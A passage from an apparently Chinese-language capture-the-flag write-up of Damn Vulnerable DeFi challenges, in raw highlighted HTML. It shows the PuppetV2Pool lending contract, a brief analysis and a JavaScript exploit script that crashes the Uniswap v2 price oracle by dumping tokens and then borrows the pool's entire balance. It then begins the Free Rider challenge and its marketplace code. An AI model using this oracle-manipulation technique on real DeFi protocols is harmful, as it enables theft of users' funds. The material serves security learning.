punctuation\">,</span> <span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> account<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">/**\n * @title PuppetV2Pool\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">PuppetV2Pool</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">using</span> <span class=\"token class-name\">SafeMath</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">private</span> _uniswapPair<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">private</span> _uniswapFactory<span class=\"token punctuation\">;</span>\n    IERC20 <span class=\"token keyword\">private</span> _token<span class=\"token punctuation\">;</span>\n    IERC20 <span class=\"token keyword\">private</span> _weth<span class=\"token punctuation\">;</span>\n    \n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> deposits<span class=\"token punctuation\">;</span>\n        \n    <span class=\"token keyword\">event</span> <span class=\"token function\">Borrowed</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> borrower<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> depositRequired<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> borrowAmount<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> timestamp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span> <span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> wethAddress<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> tokenAddress<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> uniswapPairAddress<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> uniswapFactoryAddress\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n        _weth <span class=\"token operator\">=</span> <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>wethAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        _token <span class=\"token operator\">=</span> <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>tokenAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        _uniswapPair <span class=\"token operator\">=</span> uniswapPairAddress<span class=\"token punctuation\">;</span>\n        _uniswapFactory <span class=\"token operator\">=</span> uniswapFactoryAddress<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @notice Allows borrowing `borrowAmount` of tokens by first depositing three times their value in WETH\n     *         Sender must have approved enough WETH in advance.\n     *         Calculations assume that WETH and borrowed token have same amount of decimals.\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">borrow</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> borrowAmount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>_token<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>=</span> borrowAmount<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Not enough token balance\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">// Calculate how much WETH the user must deposit</span>\n        <span class=\"token builtin\">uint256</span> depositOfWETHRequired <span class=\"token operator\">=</span> <span class=\"token function\">calculateDepositOfWETHRequired</span><span class=\"token punctuation\">(</span>borrowAmount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token comment\">// Take the WETH</span>\n        _weth<span class=\"token punctuation\">.</span><span class=\"token function\">transferFrom</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> depositOfWETHRequired<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">// internal accounting</span>\n        deposits<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> depositOfWETHRequired<span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>_token<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> borrowAmount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">Borrowed</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> depositOfWETHRequired<span class=\"token punctuation\">,</span> borrowAmount<span class=\"token punctuation\">,</span> block<span class=\"token punctuation\">.</span>timestamp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">calculateDepositOfWETHRequired</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> tokenAmount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">_getOracleQuote</span><span class=\"token punctuation\">(</span>tokenAmount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">mul</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token punctuation\">(</span><span class=\"token number\">10</span> <span class=\"token operator\">**</span> <span class=\"token number\">18</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// Fetch the price from Uniswap v2 using the official libraries</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_getOracleQuote</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">private</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> reservesWETH<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> reservesToken<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> UniswapV2Library<span class=\"token punctuation\">.</span><span class=\"token function\">getReserves</span><span class=\"token punctuation\">(</span>\n            _uniswapFactory<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>_weth<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>_token<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> UniswapV2Library<span class=\"token punctuation\">.</span><span class=\"token function\">quote</span><span class=\"token punctuation\">(</span>amount<span class=\"token punctuation\">.</span><span class=\"token function\">mul</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span> <span class=\"token operator\">**</span> <span class=\"token number\">18</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> reservesToken<span class=\"token punctuation\">,</span> reservesWETH<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"analyze-8\"><a href=\"#analyze-8\" class=\"headerlink\" title=\"analyze\"></a>analyze</h2><p>与上一题几乎相同，不过是交易对变了，并且需要存入3倍借贷金。</p>\n<p>在这道题目中看似价格计算方式发生了改变，但是引入UniswapV2Library.sol发现，quote()函数下和上一题计算方式大同小异</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">function</span> <span class=\"token function\">quote</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> amountA<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> reserveA<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> reserveB<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> amountB<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>amountA <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'UniswapV2Library: INSUFFICIENT_AMOUNT'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>reserveA <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> reserveB <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'UniswapV2Library: INSUFFICIENT_LIQUIDITY'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        amountB <span class=\"token operator\">=</span> amountA<span class=\"token punctuation\">.</span><span class=\"token function\">mul</span><span class=\"token punctuation\">(</span>reserveB<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> reserveA<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>所以攻击思路相同，大量卖出dvt，使其价格暴跌，不过此时是在Uniswap v2中进行并且将交易对改变为weth和token，再解出全部的token即可。</p>\n<h2 id=\"attack-8\"><a href=\"#attack-8\" class=\"headerlink\" title=\"attack\"></a>attack</h2><pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">const</span> path <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n       path<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>token<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">;</span>\n       path<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>weth<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">;</span>\n       <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>token<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">approve</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>uniswapRouter<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span> <span class=\"token constant\">ATTACKER_INITIAL_TOKEN_BALANCE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token keyword\">const</span> timeStamp <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span>provider<span class=\"token punctuation\">.</span><span class=\"token function\">getBlock</span><span class=\"token punctuation\">(</span><span class=\"token string\">'latest'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>timestamp <span class=\"token operator\">+</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">;</span>\n       <span class=\"token keyword\">const</span> tx <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>uniswapRouter<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">swapExactTokensForETH</span><span class=\"token punctuation\">(</span>\n           <span class=\"token constant\">ATTACKER_INITIAL_TOKEN_BALANCE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10000</span><span class=\"token punctuation\">,</span> path<span class=\"token punctuation\">,</span> attacker<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span> timeStamp<span class=\"token punctuation\">,</span>\n           <span class=\"token punctuation\">&#123;</span> <span class=\"token literal-property property\">gasLimit</span><span class=\"token operator\">:</span> <span class=\"token number\">1e6</span> <span class=\"token punctuation\">&#125;</span>\n           <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token keyword\">await</span> tx<span class=\"token punctuation\">.</span><span class=\"token function\">wait</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token keyword\">let</span> attackerETHBalance <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span>provider<span class=\"token punctuation\">.</span><span class=\"token function\">getBalance</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token keyword\">let</span> attackerETHBalanceMinusGasCost <span class=\"token operator\">=</span> attackerETHBalance<span class=\"token punctuation\">.</span><span class=\"token function\">sub</span><span class=\"token punctuation\">(</span>ethers<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span><span class=\"token function\">parseEther</span><span class=\"token punctuation\">(</span><span class=\"token string\">'0.1'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token function\">expect</span><span class=\"token punctuation\">(</span>\n           <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>lendingPool<span class=\"token punctuation\">.</span><span class=\"token function\">calculateDepositOfWETHRequired</span><span class=\"token punctuation\">(</span><span class=\"token constant\">POOL_INITIAL_TOKEN_BALANCE</span><span class=\"token punctuation\">)</span>\n       <span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>to<span class=\"token punctuation\">.</span>be<span class=\"token punctuation\">.</span><span class=\"token function\">lt</span><span class=\"token punctuation\">(</span>attackerETHBalanceMinusGasCost<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>weth<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">deposit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span> <span class=\"token literal-property property\">value</span><span class=\"token operator\">:</span> attackerETHBalanceMinusGasCost<span class=\"token punctuation\">,</span> <span class=\"token literal-property property\">gasLimit</span><span class=\"token operator\">:</span> <span class=\"token number\">1e5</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>weth<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">approve</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>lendingPool<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span> attackerETHBalanceMinusGasCost<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token keyword\">const</span> tx2 <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>lendingPool<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">borrow</span><span class=\"token punctuation\">(</span><span class=\"token constant\">POOL_INITIAL_TOKEN_BALANCE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token keyword\">await</span> tx2<span class=\"token punctuation\">.</span><span class=\"token function\">wait</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h1 id=\"10-Free-rider\"><a href=\"#10-Free-rider\" class=\"headerlink\" title=\"10.Free rider\"></a>10.Free rider</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>题目要求：</p>\n<p>A new marketplace of Damn Valuable NFTs has been released! There’s been an initial mint of 6 NFTs, which are available for sale in the marketplace. Each one at 15 ETH.</p>\n<p>A buyer has shared with you a secret alpha: the marketplace is vulnerable and all tokens can be taken. Yet the buyer doesn’t know how to do it. So it’s offering a payout of 45 ETH for whoever is willing to take the NFTs out and send them their way.</p>\n<p>You want to build some rep with this buyer, so you’ve agreed with the plan.</p>\n<p>Sadly you only have 0.5 ETH in balance. If only there was a place where you could get free ETH, at least for an instant.</p></blockquote>\n<h2 id=\"FreeRiderNFTMarketplace-code\"><a href=\"#FreeRiderNFTMarketplace-code\" class=\"headerlink\" title=\"FreeRiderNFTMarketplace code\"></a><strong>FreeRiderNFTMarketplace</strong> code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/utils/Address.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/security/ReentrancyGuard.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"../DamnValuableNFT.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">/**\n * @title FreeRiderNFTMarketplace\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">FreeRiderNFTMarketplace</span> <span class=\"token keyword\">is</span> ReentrancyGuard <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token keyword\">using</span> <span class=\"token class-name\">Address</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">;</span>\n\n    DamnValuableNFT <span class=\"token keyword\">public</span> token<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">public</span> amountOfOffers<span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// tokenId -> price</span>\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">private</span> offers<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">event</span> <span class=\"token function\">NFTOffered</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> offerer<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> tokenId<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> price<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">event</span> <span class=\"token function\">NFTBought</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> buyer<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> tokenId<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> price<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    \n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint8</span> amountToMint<span class=\"token punctuation\">)</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>amountToMint <span class=\"token operator\">&lt;</span> <span class=\"token number\">256</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Cannot mint that many tokens\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        token <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">DamnValuableNFT</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint8</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> amountToMint<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            token<span class=\"token punctuation\">.</span><span class=\"token function\">safeMint</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>        \n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">offerMany</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">calldata</span> tokenIds<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">calldata</span> prices<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> nonReentrant <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>tokenIds<span class=\"token punctuation\">.</span>length <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> tokenIds<span class=\"token punctuation\">.</span>length <span class=\"token operator\">==</span> prices<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> tokenIds<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token function\">_offerOne</span><span class=\"token punctuation\">(</span>tokenIds<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> prices<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_offerOne</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> tokenId<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> price<span class=\"token punctuation\">)</span> <span class=\"token keyword\">private</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>price <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Price must be greater than zero\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>\n            msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> token<span class=\"token punctuation\">.</span><span class=\"token function\">ownerOf</span><span class=\"token punctuation\">(</span>tokenId<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"Account offering must be the owner\"</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>\n            token<span class=\"token punctuation\">.</span><span class=\"token function\">getApproved</span><span class=\"token punctuation\">(</span>tokenId<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span>\n            token<span class=\"token punctuation\">.</span><span class=\"token function\">isApprovedForAll</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span 